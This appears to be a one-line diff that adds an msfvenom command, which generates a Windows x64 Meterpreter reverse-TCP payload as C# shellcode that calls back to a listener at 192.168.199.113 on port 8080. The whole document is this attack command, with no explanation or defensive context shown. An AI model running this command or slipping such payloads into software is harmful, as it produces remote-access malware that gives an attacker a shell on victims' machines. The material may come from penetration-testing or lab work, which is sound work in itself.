@@ -1,0 +1,1 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.199.113 LPORT=8080 -f csharp > reverse-csharp.cs
